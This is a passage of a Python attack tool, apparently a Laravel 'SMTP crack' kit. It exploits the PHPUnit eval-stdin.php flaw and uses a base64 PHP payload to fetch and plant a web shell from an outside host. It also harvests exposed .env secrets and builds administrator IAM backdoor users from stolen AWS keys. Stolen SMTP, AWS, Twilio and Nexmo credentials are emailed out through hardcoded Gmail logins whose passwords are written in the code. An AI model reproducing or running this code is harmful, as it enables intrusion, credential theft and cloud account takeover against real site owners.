# -*- coding: utf-8 -*-
#thnks for luqman add some code from PandShop,JiwaTerlena
from multiprocessing.dummy import Pool
import warnings,random,socket,threading
from re import findall as reg
import requests, re, sys, os
from colorama import Fore
from colorama import init
from time import time as timer  
import subprocess
import time
import hashlib
import datetime
from multiprocessing.dummy import Pool
import smtplib
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from socket import gaierror
from twilio.rest import Client
import boto3
init()

Targetssaaa = "sendto.ini" #for date
fsetting = open(Targetssaaa, 'r').read()
path = "path.ini" #for date
pathop = open(path, 'r')
pathline = pathop.read().split('\n')
lock = threading.Lock()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[0m'

    
Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

def exploit(url):
  data = "<?php phpinfo(); ?>"
  text = requests.get(url, data=data, timeout=5, verify=False)
  urls = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","")
  if "phpinfo()" in text.text:
    data2 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTsKCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsKCWN1cmxfY2xvc2UoJGNoKTsKCWZjbG9zZSgkZnApOwoJb2JfZmx1c2goKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hpNHU3L2p1c3QtZm9yLWZ1bi9tYXN0ZXIvd3AucGhwIiwiYXMucGhwIikpIHsKCWVjaG8gIlN1a3NlcyI7Cn0gZWxzZSB7CgllY2hvICJmYWlsIjsKfQo/Pg==')); ?>"
    spawn = requests.get(url, data=data2, timeout=5, verify=False)
    if "Sukses" in spawn.text:
      print("[SHELL INFO] "+urls+" | \033[32;1mSHELL SUCCESS\033[0m")
      buildwrite = url.replace("eval-stdin.php","as.php")+"\n"
      shellresult = open("Result/laravel_shell.txt","a")
      shellresult.write(buildwrite)
      shellresult.close()
    else:
      print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"FAILED\033[0m")
  else:
    print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")


def get_balance(a,t):
    r = requests.get('https://api.twilio.com/2010-04-01/Accounts/'+a+'/Balance.json', auth=(a,t))
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    balance = resp ['balance']
    currency = resp ['currency']
    return str(balance)+' '+str(currency)

def get_phone(a,t):
    client = Client(a,t)
    incoming_phone_numbers = client.incoming_phone_numbers.list(limit=20)
    for record in incoming_phone_numbers:
        return record.phone_number

def get_type(a,t):
    client = Client(a,t)
    account = client.api.accounts.create()  
    return account.type

def send_sms(a,t,bod,phone,tos):
    try:
        client = Client(a,t)
        message = client.messages.create(
                                    body=str(bod),
                                    from_= phone,
                                    to=tos
                                )
        return message.status
    except:
        return 'die' 

def awslimitcheck(ACCESS_KEY,SECRET_KEY,REGION):
  try:
        client = boto3.client(
        'ses',
        aws_access_key_id=ACCESS_KEY,
        aws_secret_access_key=SECRET_KEY,
        region_name=REGION,
        )
        response = client.get_send_quota()
        if "error" not in str(response):
            print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.WARNING+"Success Check Limit")
            print(str(response))
            save = open('Result/success_check_limit_awskey.txt', 'a')
            remover = str(response).replace(',', '\n')
            save.write("ACCESS KEY : "+ACCESS_KEY+"\nSECRET KEY : "+SECRET_KEY+"\nREGION : "+REGION+"\n\n"+remover + '\n\n=================================\n\n')
            save.close()
            Targetssa = input("Restart tools [y/n] : ") #for date
            if Targetssa == "n":
              sys.exit()
            else:
              print("Load Menu On 1 sec")
              print("-------------------------------")
              time.sleep(1)
              cinxx()
        else:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.FAIL+"Failed Check Limit")
  except Exception as e:
      print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.FAIL+"Failed Check Limit")
      pass
def nexmosend(url,a,s):
    r = requests.get('https://rest.nexmo.com/sms/json?api_key='+str(a)+'&api_secret='+str(s)+'&to=+6282283577544&text=test&from=TEST')
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    test = resp['messages']
    try:
        balance = test[0]["remaining-balance"]
    except:
        balance = "Error"
    try:
        errorcode = test[0]["error-text"]
    except:
        errorcode = "UNKNOWN"

    if "Quota Exceeded - rejected" in errorcode:
        print(bcolors.WARNING+str(a)+" => "+bcolors.OKBLUE+"Quota Exceeded - rejected | Balance : "+str(balance))
    elif "Bad Credentials" in errorcode:
        print(bcolors.WARNING+str(a)+" => "+bcolors.FAIL+"Bad Credentials")
    elif "Error" not in balance:
        print(bcolors.WARNING+str(a)+" => "+bcolors.OKGREEN+"Valid | Balance : "+str(balance))
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()
        sendtestnexmo(url,a,s,balance)
    else:
        print(bcolors.WARNING+str(a)+" => Cant Send to US | error code: "+str(errorcode))
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'ERROR : '+str(errorcode)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()


def twilliocheck(url,acc_sid,acc_key,acc_from):
  account_sid = acc_sid
  auth_token = acc_key
  client = Client(account_sid, auth_token)
  account = client.api.accounts.create()
  
  if "Unable to create record: Authenticate" not in account.sid:
    print("TWILLIO VALID SEND API")
    balance = get_balance(acc_sid,acc_key)
    number = get_phone(acc_sid,acc_key)
    type = get_type(acc_sid,acc_key)
    bod ='test'
    nopetest = '+14303052705'
    send = send_sms(acc_sid,acc_key,bod,number,nopetest)
    if send == 'die':
        status = 'CANT SEND SMS TO US'
    else:
        status = 'LIVE'
    
    save = open('Result/valid_twillio.txt', 'a')
    build = 'URL: '+str(url)+'\nSTATUS : '+format(str(status))+'\nAccount SID : '+str(acc_sid)+'\nAuth Key: '+str(acc_key)+'\nBalance : '+format(str(balance))+'\nFROM: '+format(str(number))+'\nAccount Type : '+format(str(type))+'\n\n------------------------------------------------\n'
    save.write(build)
    save.close()
    sendtesttwillio(url,acc_sid,acc_key,acc_from,status,balance)
def autocreate(ACCESS_KEY,SECRET_KEY,REGION):
    try:
        client = boto3.client(
        'ses',
        aws_access_key_id=ACCESS_KEY,
        aws_secret_access_key=SECRET_KEY,
        region_name=REGION,
        )
        response = client.get_send_quota()

        client2 = boto3.client(
        'iam',
        aws_access_key_id=ACCESS_KEY,
        aws_secret_access_key=SECRET_KEY,
        region_name=REGION,
        )
        response1 = client2.create_user(
        UserName='ses_xcatze',
        )
        response2 = client2.create_login_profile(
        UserName='ses_xcatze',
        Password='ses_xcatze123',
        PasswordResetRequired=False
        )
        response3 = client2.create_group(
        GroupName='AdminsDDefault'
        )
        response4 = client2.attach_group_policy(
        GroupName='AdminsDDefault',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        response5 = client2.add_user_to_group(
        GroupName='AdminsDDefault',
        UserName='ses_xcatze'
        )
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.OKGREEN+"Success Create User")
        save = open('Result/cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')

        save.write("ACCESS KEY : "+ACCESS_KEY+"\nSECRET KEY : "+SECRET_KEY+"\nREGION : "+REGION+"\n\n==> Created User\n\n"+remover2+"\n\n==> USER & PASS IAM USER\n\nUser : ses_xcatze\nPass : ses_xcatze123\n\n"+remover +'\n\n=================================\n\n')
        save.close()
        try:
          url = "FROM CRACK TOOL"
          sendtestaws(url,ACCESS_KEY,SECRET_KEY,REGION,remover2,remover)
        except:
          pass
    except Exception as e:
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.FAIL+"Failed Create User")
        pass
        
def autocreateses(url,ACCESS_KEY,SECRET_KEY,REGION):
    try:
        client = boto3.client(
        'ses',
        aws_access_key_id=ACCESS_KEY,
        aws_secret_access_key=SECRET_KEY,
        region_name=REGION,
        )
        response = client.get_send_quota()

        client2 = boto3.client(
        'iam',
        aws_access_key_id=ACCESS_KEY,
        aws_secret_access_key=SECRET_KEY,
        region_name=REGION,
        )
        response1 = client2.create_user(
        UserName='ses_xcatze',
        )
        response2 = client2.create_login_profile(
        UserName='ses_xcatze',
        Password='ses_xcatze123',
        PasswordResetRequired=False
        )
        response3 = client2.create_group(
        GroupName='AdminsDDefault'
        )
        response4 = client2.attach_group_policy(
        GroupName='AdminsDDefault',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        response5 = client2.add_user_to_group(
        GroupName='AdminsDDefault',
        UserName='ses_xcatze'
        )
        print(ACCESS_KEY+" ==> Success Create User")
        save = open('Result/cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')

        save.write("ACCESS KEY : "+str(ACCESS_KEY)+"\nSECRET KEY : "+str(SECRET_KEY)+"\nREGION : "+str(REGION)+"\n\n==> Created User\n\n"+str(remover2)+"\n\n==> USER & PASS IAM USER\n\nUser : ses_xcatze\nPass : ses_xcatze123\n\n"+str(remover) +"\n\n=================================\n\n")
        save.close()
        try:
          sendtestaws(url,ACCESS_KEY,SECRET_KEY,REGION,remover2,remover)
        except:
          pass
    except Exception as e:
        print(ACCESS_KEY+" ==> Failed Create User")
        pass

class dorker(object):

    def __init__(self,dork,pages,proxy):
        self.dork = dork
        self.page_ammount = pages
        self.domains_bing = []
        self.proxy_required = proxy
        self.first_page_links = []


    def filter_and_adding(self,domains_list):
        alert_string = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'INFO' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(alert_string+"-> Checking Smtp ..")
        print()
        data = open('blacklist/sites.txt').readlines()
        new_data = [items.rstrip() for items in data]
        for domains in domains_list:
            domain_data = domains.split('/')
            new_domain = domain_data[0]+"//"+domain_data[2]+'/'
            if new_domain not in new_data:
                self.domains_bing.append(new_domain)
                jembotngw2(new_domain)
                print(new_domain,file=open('result/sitesgrab.txt', 'a'))



    def first_page(self):
        try:
            url = "https://www.bing.com/search?q=" + self.dork + "&first=" + '1' + "&FORM=PERE"
            header = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }
            source_code = requests.get(url, headers=header).text
            keyword = '<li class="b_algo"><h2><a href="'
            split_data = source_code.split(keyword)
            for x in range(10):
                links_ = split_data[x + 1].split('"')[0]
                self.first_page_links.append(links_)
        except IndexError:
            pass

    def searcher(self):
        for i in range(self.page_ammount):
            url = "https://www.bing.com/search?q=" + self.dork +"&first=" + str(i)+'1' + "&FORM=PERE"
            info_string_box = Fore.LIGHTCYAN_EX+'['+Fore.LIGHTBLUE_EX+'-'+Fore.LIGHTCYAN_EX+']'+Fore.WHITE
            added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + '+' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE

            print(info_string_box+f" Printing Page  {i}")
            print()
            header = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }
            try:
                source_code = requests.get(url,headers=header).text
                keyword = '<li class="b_algo"><h2><a href="'
                split_data = source_code.split(keyword)
                temporary_domain_list = []
                try:
                    for x in range(10):
                        links_ = split_data[x+1].split('"')[0]
                        temporary_domain_list.append(links_)
                        print(added_sting+" - "+links_)

                except IndexError:
                    pass

                print()
                print('--------')
                self.filter_and_adding(temporary_domain_list)


            except requests.exceptions.HTTPError:
                print("Http error retrying")
                continue
            except requests.exceptions.ConnectTimeout:
                print("Connection timed out error retrying")
                continue
            except requests.exceptions.Timeout:
                print("Timeout error retrying")
                continue

            if i != 0:
                if self.first_page_links == temporary_domain_list:
                    print("Same Urls Found Again. Last Resulsts Reached | Removing Dublicates.")
                    break

    def start(self):

        self.first_page()
        self.searcher()

        print(f"Done Total sites scrapped {len(self.domains_bing)}")


proxy_error = 0
sites_list = []

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

init(convert=True)

class settings:
	y = Fore.YELLOW
	r = Fore.RED
	b = Fore.BLUE

def ip_grabber(site,sites_length,current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTBLUE_EX + 'SITE' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'IP' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(info_string_box + f': {site} - ' + added_sting + f': {ip}')
        oother = open('result/websitetoip.txt', "a")
        oother.write(ip+"\n")
        oother.close()
    except socket.gaierror:
        pass

def ip_grabberautoscan(site,sites_length,current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTBLUE_EX + 'SITE' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'IP' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(info_string_box + f': {site} - ' + added_sting + f': {ip}')
        dorkscan(ip)
        oother = open('result/websitetoip.txt', "a")
        oother.write(ip+"\n")
        oother.close()
    except socket.gaierror:
        pass

def clean():
  lines_seen = set()
  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  outfile = open('rd-'+Targetssa, "a")
  infile = open(Targetssa, "r")
  for line in infile:
    if line not in lines_seen:
      outfile.write(line)
      lines_seen.add(line)
  outfile.close()
  infile.close()
  print("Duplicate removed successfully!")
  print("saved as rd-"+str(Targetssa))
  print("Load Menu On 1 sec")
  print("-------------------------------")
  time.sleep(1)
  cinxx()

def autodork():
  dork = input("Dork/Keyword [not a file but type directly]: ")
  print()
  print("""
      select your country, all for global | for country search in,de,fr type directly without .
  """)
  print()
  country = input("Country: ")
  if country == 'all':
      dork_new = dork
  else:
      dork_new = dork+' site:'+country
  # Perform anti public actions here
  pages_ = input("Pages [Note: Bing may have limited results]: ")
  dorker(dork_new,int(pages_),False).start()

binglist = {"http://www.bing.com/search?q=&count=50&first=1",
"http://www.bing.com/search?q=&count=50&first=51",
"http://www.bing.com/search?q=&count=50&first=101",
"http://www.bing.com/search?q=&count=50&first=151",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com/search?q=&count=50&first=251",
"http://www.bing.com/search?q=&count=50&first=301",
"http://www.bing.com/search?q=&count=50&first=351",
"http://www.bing.com/search?q=&count=50&first=401",
"http://www.bing.com/search?q=&count=50&first=451",
"http://www.bing.com/search?q=&count=50&first=501",
"http://www.bing.com/search?q=&count=50&first=551",
"http://www.bing.com/search?q=&count=50&first=601",
"http://www.bing.com/search?q=&count=50&first=651",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.vn/search?q=&count=50&first=101"}

def dorkscan(dork):
  jembotngw2(dork)
  if "ip" not in dork:
    dork = " ip:\""+dork+"\" "
  print("START REVERSE FROM IP => "+dork)
  for bing in binglist:
    bingg = bing.replace("&count",dork+"&count")
    try:
      r = requests.get(bingg)
      checktext = r.text
      checktext = checktext.replace("<strong>","")
      checktext = checktext.replace("</strong>","")
      checktext = checktext.replace('<span dir="ltr">','')
      checksites = re.findall('<cite>(.*?)</cite>',checktext)
      for sites in checksites:
        sites = sites.replace("http://","protocol1")
        sites = sites.replace("https://","protocol2")
        sites = sites + "/"
        site = sites[:sites.find("/")+0]
        site = site.replace("protocol1","http://")
        site = site.replace("protocol2","https://")
        try:
          jembotngw2(site)
        except:
            pass
    except:
      pass


def sparkpostmail():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sparkpostmail=on" in ip_listx:
    sparkpostmail = "on"
    return sparkpostmail
  else:
    sparkpostmail = "off"
    return sparkpostmail
def and1():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "and1=on" in ip_listx:
    and1 = "on"
    return and1
  else:
    and1 = "off"
    return and1
def zimbra():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zimbra=on" in ip_listx:
    zimbra = "on"
    return zimbra
  else:
    zimbra = "off"
    return zimbra

def relay():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "gsuite-relay=on" in ip_listx:
    relay = "on"
    return relay
  else:
    relay = "off"
    return relay

def sendinblue():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendinblue=on" in ip_listx:
    sendinblue = "on"
    return sendinblue
  else:
    sendinblue = "off"
    return sendinblue

def mandrillapp():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mandrillapp=on" in ip_listx:
    mandrillapp = "on"
    return mandrillapp
  else:
    mandrillapp = "off"
    return mandrillapp

def zoho():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zoho=on" in ip_listx:
    zoho = "on"
    return zoho
  else:
    zoho = "off"
    return zoho
def sendgrid():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendgrid=on" in ip_listx:
    sendgrid = "on"
    return sendgrid
  else:
    sendgrid = "off"
    return sendgrid
def office365():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "office365=on" in ip_listx:
    office365 = "on"
    return office365
  else:
    office365 = "off"
    return office365
def mailgun():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mailgun=on" in ip_listx:
    mailgun = "on"
    return mailgun
  else:
    mailgun = "off"
    return mailgun

def phpunitshell():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "phpunitshell=on" in ip_listx:
    phpunitshell = "on"
    return phpunitshell
  else:
    phpunitshell = "off"
    return phpunitshell

def aws():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "aws=on" in ip_listx:
    aws = "on"
    return aws
  else:
    aws = "off"
    return aws
def twillio():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "twillio=on" in ip_listx:
    twillio = "on"
    return twillio
  else:
    twillio = "off"
    return twillio

def AWS_ACCESS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_ACCESS_KEY=on" in ip_listx:
    AWS_ACCESS_KEY = "on"
    return AWS_ACCESS_KEY
  else:
    AWS_ACCESS_KEY = "off"
    return AWS_ACCESS_KEY

def AWS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_KEY=on" in ip_listx:
    AWS_KEY = "on"
    return AWS_KEY
  else:
    AWS_KEY = "off"
    return AWS_KEY

def NEXMO():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "NEXMO=on" in ip_listx:
    NEXMO = "on"
    return NEXMO
  else:
    NEXMO = "off"
    return NEXMO

def EXOTEL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "EXOTEL=on" in ip_listx:
    EXOTEL = "on"
    return EXOTEL
  else:
    EXOTEL = "off"
    return EXOTEL
def ONESIGNAL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "ONESIGNAL=on" in ip_listx:
    ONESIGNAL = "on"
    return ONESIGNAL
  else:
    ONESIGNAL = "off"
    return ONESIGNAL

def TOKBOX():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "TOKBOX=on" in ip_listx:
    TOKBOX = "on"
    return TOKBOX
  else:
    TOKBOX = "off"
    return TOKBOX

def sendtestoff(url,host,port,user,passw,sender):
        
        if "465" in str(port):
          port = "587"
        else:
          port = str(port)
        
        smtp_server = str(host)
        if "UNKNOWN" in sender:
          sender_email = user
        else:
          sender_email = str(sender.replace('\"',''))
        smtp_server = str(host)
        login = str(user.replace('\"',''))
        password = str(passw.replace('\"',''))
        receiver_email = "smtptest65@yahoo.com"
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "LARAVEL SMTP CRACK LOG | HOST: "+str(host)
        if "zoho" in host:
          message["From"] = user
        else:
          message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
            <p>Success Send,<br>
              BY XCATZE</p>
              <p>-------------------</p>
              <p>URL    : {url}</p>
              <p>HOST   : {host}</p>
              <p>PORT   : {port}</p>
              <p>USER   : {user}</p>
              <p>PASSW  : {passw}</p>
              <p>SENDER : {sender}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())

        except:
          pass


def sendtest(url,host,port,user,passw,sender):
        
        if "465" in str(port):
          port = "587"
        else:
          port = str(port)

        if "unknown@unknown.com" in sender and "@" in user:
          sender_email = user
        else:
          sender_email = str(sender.replace('\"',''))

        smtp_server = str(host)
        login = str(user.replace('\"',''))
        password = str(passw.replace('\"',''))
        # specify the sender’s and receiver’s email addresses

        receiver_email = str(fsetting)
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "LARAVEL SMTP CRACK | HOST: "+str(host)
        if "zoho" in host:
          message["From"] = user
        else:
          message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
            <p>Success Send,<br>
              BY XCATZE</p>
              <p>-------------------</p>
              <p>URL    : {url}</p>
              <p>HOST   : {host}</p>
              <p>PORT   : {port}</p>
              <p>USER   : {user}</p>
              <p>PASSW  : {passw}</p>
              <p>SENDER : {sender}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
          print('Sent To '+str(fsetting))
          if "apikey" in user or "aws" in host or "mailgun" in host or "mandrill" in host:
            sendtestoff(url,host,port,user,passw,sender)
        except (gaierror, ConnectionRefusedError):
          print('Failed to connect to the server. Bad connection settings?')
        except smtplib.SMTPServerDisconnected:
          print('Failed to connect to the server. Wrong user/password?')
        except smtplib.SMTPException as e:
          print('SMTP error occurred: ' + str(e))

def sendtestaws(url,user,passw,ports,re2,re1):
        
        smtp_server = "smtp.gmail.com"
        sender_email = "chetandevloper2020@gmail.com"
        port = 587
        login = "chetandevloper2020@gmail.com"
        password = "chetan2020&&"
        receiver_email = "smtptest65@yahoo.com"
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "AWS KEY LOG | "+ str(ports) 
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
            <p>Success Send,<br>
              BY XCATZE</p>
              <p>-------------------</p>
              <p>URL          : {url}</p>
              <p>AWSKEY       : {user}</p>
              <p>SECRET KEY   : {passw}</p>
              <p>CHECKER      : {user}|{passw}|{ports}</p>
              <p>-------------------</p>
              <p>CREATED USER =></p>
              <p></p>
              <p>{re2}</p>
              <p></p>
              <p>USER : ses_xcatze</p>
              <p>Pass : ses_xcatze123</p>
              <p>-------------------</p>
              <p>LIMIT DETAIL =></p>
              <p></p>
              <p>{re1}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
        except:
          pass

def sendtesttwillio(url,user,passw,ports,status,balance):
        
        smtp_server = "smtp.gmail.com"
        sender_email = "plamsal6@gmail.com"
        port = 587
        login = "hulaakmarket@gmail.com"
        password = "jkhuihsnhneghull"
        receiver_email = "smtptest65@yahoo.com"
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "TWILLIO LOG | "+str(ports)
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
            <p>Success Send,<br>
              BY XCATZE</p>
              <p>-------------------</p>
              <p>URL      : {url}</p>
              <p>SID      : {user}</p>
              <p>TOKEN    : {passw}</p>
              <p>FROM     : {ports}</p>
              <p>STATUS   : {status}</p>
              <p>BALANCE  : {balance}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
        except:
          pass

def sendtestnexmo(url,user,passw,balance):
        
        smtp_server = "smtp.gmail.com"
        sender_email = "chetandevloper2020@gmail.com"
        port = 587
        login = "chetandevloper2020@gmail.com"
        password = "chetan2020&&"
        receiver_email = "smtptest65@yahoo.com"
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "NEXMO LOG | "+str(ports)
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
            <p>Success Send,<br>
              BY XCATZE</p>
              <p>-------------------</p>
              <p>URL      : {url}</p>
              <p>NEXMO    : {user}</p>
              <p>NEXMOAPI : {passw}</p>
              <p>BALANCE  : {balance}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
        except:
          pass

def prepare(sites):

    try:
      meki = requests.get(sites+'/.env',headers=Headers,timeout=8)
      if 'DB_PASSWORD=' in meki.text:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mSuccess".format(str(sites)))
        open('config-'+year+month+day+'.txt', 'a').write("\n---------------KRINSIDE env-------------\n"+sites+"\n"+meki.text + '\n-----------------------------------------\n\n')
      else:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mFailed".format(str(sites)))
    except Exception as e:
        pass

def get_smtp(url,text):
  try:
    if "MAIL_HOST" in text:
      if "MAIL_HOST=" in text:
        mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
        try:
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
        except:
          mailport = 587
        mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
        mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
        if "MAIL_FROM" in text:
          mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
        else:
          mailfrom = "unknown@unknown.com"
          
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        if ".amazonaws.com" in text and aws() == "on":
